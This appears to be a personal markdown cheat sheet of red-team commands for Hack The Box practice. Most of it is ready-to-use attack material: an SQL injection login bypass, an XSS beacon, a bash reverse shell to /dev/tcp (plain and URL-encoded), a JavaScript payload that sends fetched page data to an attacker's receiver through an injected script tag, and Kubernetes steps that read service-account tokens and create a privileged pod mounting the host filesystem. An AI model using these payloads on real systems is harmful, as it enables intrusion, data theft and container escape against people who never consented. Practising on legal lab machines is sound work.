# Hack the box

To lazy to create another repo for even more notes...

This document will focus on writing down command to play with for when doing red team work.
Something something only use for good.

## Setup

Follow the settings in hack the back page.
Download the package file and start the openvpn.

```shell
sudo openvpn my.ovpn
```

## nmap

```shell
sudo nmap -sC -sV -oA nmap/example 192.168.0.1
# -sC = default script
# -sV = Probe open ports and versions
# -oA = output

sudo nmap -p- -n -oA nmap-allports 192.168.0.1
```

## gobuster

```shell
# kali linux
gobuster dir -u http://192.168.0.1 -w /opt/SecLists/Discovery/web-Content/raft-small-words.txt -x php -o gobuster.out

# arch
gobuster dir -u http://10.129.20.199 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x js, html -o gobuster.out

gobuster vhost -u http://10.129.20.199  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster.vhost.out

```

## Burp

Can do a bunch of things :)

## Sqlmap

Sql injection [tool](https://sqlmap.org/) written in python.
Save the output of your request from burp and give it to sqlmap.
Have sqlmap try a number of injects for you.

```shell
sqlmap -r login.req --batch
```

### So basic sql injection

```.php
username=admin'#&password=a
# Web encode '# and forward to the host. In this case the php site will take think the sql query ends.
# So they query only checks for username admin and if it exists thats okay. The password query isn't forwarded.
username=admin%27%23&password=a
```

## Cross site scripting

Even more basic stuff :)
This is something that you can put in forms to see if the potentially might run scripts for you.

Make sure that you have something listening on your client, for example through nc.
Just listen and see if it was a request sent to it.

Another option is to use python as a webserver, more information at the python part.

```.html
<img src="http://192.168.0.1/message"></img>
```

## remote exec

### nc or ncat

Setup and listen for incoming traffic from remote exec on your local host.

```shell
nc -lvnp 9001
```

On the remote host that you want to forward your session to.
Lets assume that your local host got the ip 10.10.0.1.

```shell
bash -c 'bash -i >& /dev/tcp/10.10.0.1/9001'
# Might need to web encode the request or something similar
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.0.1%2F9001%27
```

## fuzzing

```shell
# FUZZ is the targeted value in this case that should be changed by the fuzzer
wfuzz -u http://10.10.0.1/accounts.php -H <your content type> -d 'username=something&password=12345&FUZZ=12345' -w /path/to/burp-parameter-names.txt
```

## Python

### Start bash from python

And give your self a decent working environment.

```shell
python3 -c ' import pty;pty.spawn("/bin/bash")'
# put it in background
stty raw -echo; fg
export TERM=xterm
```

### Web server

```shell
# sudo needed since port 80 ^^
sudo python3 -m http.server 80
```

## nodejs

Go to target.url make a GET request and save the response.
Use a POST to our receiver endpoint and post the response.
This way we can have a remote host send data to our server and we can see what data it contains.

```pwn.js
var target = "http://taget.url";
var receiver = http://192.168.0.1:8000/
var req1 = new XMLHttpRequest(); # Similar to what the host is using.
req1.open('GET', target, false);
req1.send();
var response = req1.responseText;

var req2 = new XMLHttpRequest(); # Similar to what the host is using.
req2.open('POST', receiver, false); # Your receiver page
req2.send(response);
```

Through burp or what ever tool you are using to send request to your vulnerable page.
Tell it to download your pawn.js and it can run it.

For example

```html request
Referer: <script src="http://192.168.0.1/pawn.js"></script>
```

Your primary listening server on port 80 in this case will server the attacked server with pawn.js.
Pawn.js will then run the script and in this case forward the reply to your secondary server.

## Hashcat

Password recovery utility, used together with a word list.

```shell
hashcat file-containing-password /path/to/wordlist
```

## web tools

wappalyzer = a tool that scans homepages as a extensions and gives you information what technologies it uses.
For example php, js etc.

## kubernetes

OWASP kubernetes security [cheat sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Kubernetes_Security_Cheat_Sheet.md)

Depending on what tools you have available in the container you there are a number of ways of start talking to the kubernetes API.

```shell
openssl s_client -connect kubernetes.default.svc.cluster.local.:443 < /dev/null 2>/dev/null |openssl x509 -noout -text |grep -E "DNS:| IP Address:"
```

### kubernetes API

Kubernetes containers contain a bunch of default env vars. These vars are easily used to talk to the kubernetes API.

[access k8s api](https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/)

```shell
curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
# Point to the internal API server hostname
APISERVER=https://kubernetes.default.svc
# Path to ServiceAccount token
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
# Read this Pod's namespace
NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
# Read the ServiceAccount bearer token
TOKEN=$(cat ${SERVICEACCOUNT}/token)
# Reference the internal certificate authority (CA)
CACERT=${SERVICEACCOUNT}/ca.crt
# Explore the API with TOKEN
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api

# get all pods in your current namespace
curl  --cacert ${CACERT} -s $APISERVER/api/v1/namespaces/$NAMESPACE/pods/ --header "Authorization: Bearer $TOKEN"

# Get a specific pod
curl  --cacert ${CACERT} -s $APISERVER/api/v1/namespaces/kube-system/pods/kube-apiserver-kind-control-plane | head -n 10
```

#### create a bad pod using rest API

```shell
curl --cacert ${CACERT} --header "Authorization: Bearer $TOKEN" -X POST -H 'Content-Type: application/yaml' \
--data '
apiVersion: v1
kind: Pod
metadata:
  name: debug3
spec:
  containers:
    - command:
        - /bin/sh
      resources:
        requests:
          memory: "16Mi"
          cpu: "10m"
        limits:
          memory: "64Mi"
          cpu: "100m"
      image: alpine:latest
      name: container-00
      securityContext:
        privileged: true
        runAsUser: 0
      tty: true
      volumeMounts:
        - mountPath: /host
          name: host
  volumes:
    - hostPath:
        path: /
        type: Directory
      name: host
  hostNetwork: true
' "https://${KUBERNETES_SERVICE_HOST}/api/v1/namespaces/${NAMESPACE}/pods"
```

#### k8s api exec using python

To create a pod and [exec](https://github.com/kubernetes-client/python/blob/master/examples/pod_exec.py)
I have done a minor update to the script so it instead uses credentials from running inside a pod [kubernetes/pod_exec.py](kubernetes/pod_exec.py)

At the same time it's not worth having all the access that you need to exec. It would be a extremely strange rbac rule to write for a normal service account, so this isn't very realistic.
Instead you should focus on writing a good container file that automatically gives you a shell using something like ncat.

But it's a good option if you don't got curl or wget but you have python and you want a simple script to create a pod.
At the same time you would have to install pip or rewrite the script to use pure rest api instead.

If you want to install pip you can easily do so through `python -m ensurepip --upgrade`

### kubectl within a pod

Just download kubectl and thanks to the environment vars you don't have to do anything.
Having issues to create an active session towards the host. But not a problem to perform single commands.
Need to do some redirect magic to stdout and it should work.

### dns

Outputs all dns endpoints in a cluster.

```shell
dig +noall +answer srv any.any.svc.cluster.local
```

### kubernetes tools

[check capabilities etc](https://github.com/genuinetools/amicontained)
[container analyze tool](https://github.com/brompwnie/botb)

## ctf options

There are a number of ways of holding a Capture The Flag (CTF). One way could potentially be: [https://github.com/redcode-labs/RedNix](https://github.com/redcode-labs/RedNix)

## install

```shell
pacman -S nmap
yay -S gobuster
yay -S sqlmap
yay -S seclists
```

[burp](https://portswigger.net/burp/releases/professional-community-2022-2-3)

Just like when installing zap burp needs to be installed as root.
